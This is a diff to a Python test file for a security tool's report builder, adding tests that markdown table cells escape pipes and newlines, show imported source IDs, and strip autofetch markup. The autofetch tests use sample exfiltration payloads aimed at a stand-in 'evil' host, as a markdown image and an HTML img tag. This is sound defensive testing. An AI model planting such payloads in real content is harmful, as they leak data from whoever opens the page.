@@ -1,13 +1,17 @@
-#!/usr/bin/env python3
 """Tests for findings-specific report building."""
 
+import re
 import unittest
+
 from core.reporting.findings import (
-    build_findings_rows, build_findings_summary, findings_summary_line,
-    findings_summary, build_findings_spec, build_finding_detail,
+    build_finding_detail,
+    build_findings_rows,
+    build_findings_spec,
+    build_findings_summary,
+    findings_summary,
+    findings_summary_line,
 )
 from core.reporting.renderer import render_report
-
 
 SAMPLE_FINDINGS = [
     {
@@ -121,6 +125,48 @@ class TestFindingsSummary(unittest.TestCase):
         self.assertIn("out of 3", result)
 
 
+class TestMarkdownRowEscaping(unittest.TestCase):
+    """Consistency tests: finding-derived table cells are inert in the
+    rendered markdown summary — same escaping policy as the per-finding
+    detail table."""
+
+    def test_pipe_in_cells_does_not_add_columns(self):
+        findings = [{
+            "id": "F-1",
+            "file": "src/x|y.c",
+            "line": 3,
+            "vuln_type": "cmd|injection",
+            "cwe_id": "CWE-78|CWE-79",
+            "ruling": {"status": "confirmed"},
+        }]
+        result = findings_summary(findings)
+        # 7 columns → exactly 8 unescaped pipes per table line.
+        for line in result.splitlines():
+            if line.startswith("|"):
+                self.assertEqual(len(re.findall(r"(?<!\\)\|", line)), 8, line)
+
+    def test_newline_in_cell_stays_one_row(self):
+        findings = [{
+            "id": "F-1",
+            "file": "a.c\n# fake heading",
+            "line": 1,
+            "vuln_type": "xss",
+            "ruling": {"status": "confirmed"},
+        }]
+        result = findings_summary(findings)
+        self.assertNotIn("# fake heading", result.splitlines())
+
+    def test_console_rows_unescaped(self):
+        """The console path shares `build_findings_rows` — it must keep
+        raw cells (the console renderer does its own escaping)."""
+        findings = [{
+            "id": "F-1", "file": "x|y.c", "line": 1,
+            "vuln_type": "xss", "ruling": {"status": "confirmed"},
+        }]
+        rows = build_findings_rows(findings, filename_only=True)
+        self.assertIn("x|y.c:1", rows[0][3])
+
+
 class TestBuildFindingDetail(unittest.TestCase):
 
     def test_has_title_and_attributes(self):
@@ -148,6 +194,22 @@ class TestBuildFindingDetail(unittest.TestCase):
         section = build_finding_detail(finding, 1)
         self.assertIn("**Remediation:**", section.content)
         self.assertIn("strncpy", section.content)
+
+    def test_source_id_rendered_for_imported_finding(self):
+        """Imported findings keep their foreign id as ``source_id``
+        after normalisation to FIND-<n>; the detail table surfaces it
+        so the finding traces back to the producing pipeline."""
+        finding = {**SAMPLE_FINDINGS[0],
+                   "source_id": "src/auth.c:check_token:88"}
+        section = build_finding_detail(finding, 1)
+        self.assertIn(
+            "| Source ID | `src/auth.c:check_token:88` |",
+            section.content,
+        )
+
+    def test_no_source_id_row_when_absent(self):
+        section = build_finding_detail(SAMPLE_FINDINGS[0], 1)
+        self.assertNotIn("| Source ID |", section.content)
 
     def test_function_slot_labeled_function_for_code_finding(self):
         """Code findings (semgrep / codeql / agentic) put a real
@@ -293,6 +355,38 @@ class TestBuildFindingsSpec(unittest.TestCase):
     def test_no_details(self):
         spec = build_findings_spec(SAMPLE_FINDINGS, include_details=False)
         self.assertEqual(len(spec.detail_sections), 0)
+
+
+class TestMdTableCellAutofetch(unittest.TestCase):
+    """Report-injection: finding-derived cell values must not render
+    autofetch markup (same defense the LLM-output sanitiser applies —
+    an `![](url)` in a file path or scanner message otherwise fires
+    an exfil request when the report is opened in a browser)."""
+
+    def test_image_markup_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("pre ![x](http://evil/exfil?q=1) post")
+        self.assertNotIn("![", out)
+        self.assertNotIn("http://evil", out)
+        self.assertIn("[REDACTED-AUTOFETCH-MARKUP]", out)
+
+    def test_html_img_tag_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell('<img src="http://evil/x">')
+        self.assertNotIn("img", out)
+        self.assertNotIn("http://evil", out)
+
+    def test_legitimate_function_signature_survives(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("check_pw(user, pw) | validate[0]")
+        self.assertIn("check_pw(user, pw)", out)
+        self.assertIn("\\|", out)
+
+    def test_existing_escapes_unchanged(self):
+        from core.reporting.findings import _md_table_cell
+        self.assertEqual(_md_table_cell("a|b"), "a\\|b")
+        self.assertEqual(_md_table_cell("a`b"), "a\\`b")
+        self.assertEqual(_md_table_cell("a\nb"), "a<br>b")
 
 
 if __name__ == "__main__":
